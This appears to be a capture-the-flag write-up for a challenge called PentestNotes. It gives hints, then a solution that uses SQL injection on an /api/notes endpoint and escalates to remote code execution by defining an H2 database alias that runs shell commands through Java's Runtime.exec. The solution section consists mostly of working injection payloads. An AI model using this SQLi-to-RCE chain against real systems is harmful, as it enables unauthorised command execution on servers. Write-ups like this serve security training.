## PentestNotes 

```
before checking the solution, try this spoiler first
```

1. Try to look for the vulnerabilities
2. check the code and the error messages, it's been helpful
3. find a vulnerable page
4. try to identify the vulnerable parameter
5. locate an RCE.


### Solution

locate the vulnerable page /api/notes with the POST request
try an SQLi
concat() and $ are filtered.

1. identify the vulnerability.
```sql
SQL Injection' Union select '6'||'1',''||'',''||'';  -- -
```
We have an output so it's not blind sql, good sign.

2. it's using h2 database with spring framework, we create create an alias to execute java code.

```sql
SQL'||' Injection' Union select '6'||'1',''||'',''||''; CREATE ALIAS shell as '
String e(String cmd) throws java.io.IOException, InterruptedException {
        java.lang.Runtime rt = java.lang.Runtime.getRuntime();
        Process p = rt.exec(cmd);
        p.waitFor();
        java.io.InputStream inputStream = p.getInputStream();
        StringBuilder output = new StringBuilder();
        int ch;
        while ((ch = inputStream.read()) != -1) {
            output.append((char) ch);
        }
        inputStream.close();
        return output.toString();
    }' ;  -- -
```
and then read the output of the function

```sql
SQL Injection' Union select '6'||'1',''||'',''||shell('cat /');  -- -
```